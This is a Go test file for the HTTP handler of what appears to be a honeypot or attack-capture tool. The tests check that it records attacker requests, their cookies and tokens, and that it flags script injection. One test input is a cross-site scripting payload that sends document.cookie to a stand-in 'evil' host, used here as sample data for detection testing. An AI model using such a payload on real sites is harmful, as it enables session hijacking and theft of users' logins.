package handler

import "testing"

// The HTTP handler captures the full request surface — method, full URI +
// parsed query params, every header, cookies, and any bearer/basic credential —
// so an analyst sees exactly what an attacker sent and the captures page can
// surface the cookies + tokens.
func TestHTTPFullCapture(t *testing.T) {
	req := "POST /admin/login.php?next=%2Fdashboard&debug=1 HTTP/1.1\r\n" +
		"Host: target.example\r\n" +
		"User-Agent: sqlmap/1.7\r\n" +
		"Authorization: Bearer eyJ0okenABC.def\r\n" +
		"Cookie: SESSIONID=deadbeef; csrftoken=cafe\r\n" +
		"Referer: http://target.example/\r\n" +
		"Content-Type: application/x-www-form-urlencoded\r\n" +
		"Content-Length: 0\r\n\r\n"
	res := serveHTTPOnce(t, req)

	if res.Meta["http_method"] != "POST" {
		t.Errorf("http_method = %v", res.Meta["http_method"])
	}
	if uri, _ := res.Meta["http_uri"].(string); uri == "" || uri[:13] != "/admin/login." {
		t.Errorf("http_uri = %v", res.Meta["http_uri"])
	}

	qp, _ := res.Meta["http_query_params"].(map[string]string)
	if qp["next"] != "/dashboard" || qp["debug"] != "1" {
		t.Errorf("query params not decoded: %v", qp)
	}

	hdrs, _ := res.Meta["http_headers"].(map[string]string)
	if hdrs["user-agent"] == "" || hdrs["authorization"] == "" {
		t.Errorf("headers not captured: %v", hdrs)
	}

	cookies, _ := res.Meta["http_cookies"].(map[string]string)
	if cookies["SESSIONID"] != "deadbeef" || cookies["csrftoken"] != "cafe" {
		t.Errorf("cookies not parsed: %v", cookies)
	}

	// Credential keys flow to the captures page via extractCreds.
	if res.Meta["cookie"] == nil {
		t.Error("cookie not surfaced for captures page")
	}
	if res.Meta["authorization"] == nil {
		t.Error("authorization not surfaced for captures page")
	}
	if tok, _ := res.Meta["bearer_token"].(string); tok != "eyJ0okenABC.def" {
		t.Errorf("bearer_token = %v", res.Meta["bearer_token"])
	}
}

func TestHTTPJavaScriptCapture(t *testing.T) {
	// A reflected/stored-XSS payload in the query string is captured + flagged.
	req := "GET /search?q=<script>document.location='http://evil/'+document.cookie</script> HTTP/1.1\r\n" +
		"Host: x\r\n\r\n"
	res := serveHTTPOnce(t, req)
	if !containsStr(anomaliesOf(res), "http-javascript-payload") {
		t.Errorf("javascript payload not flagged: %v", res.Meta["anomalies"])
	}
	js, _ := res.Meta["http_javascript"].([]string)
	if len(js) == 0 {
		t.Fatalf("no javascript captured")
	}
	if js[0][:7] != "<script" {
		t.Errorf("captured js = %q", js[0])
	}
}
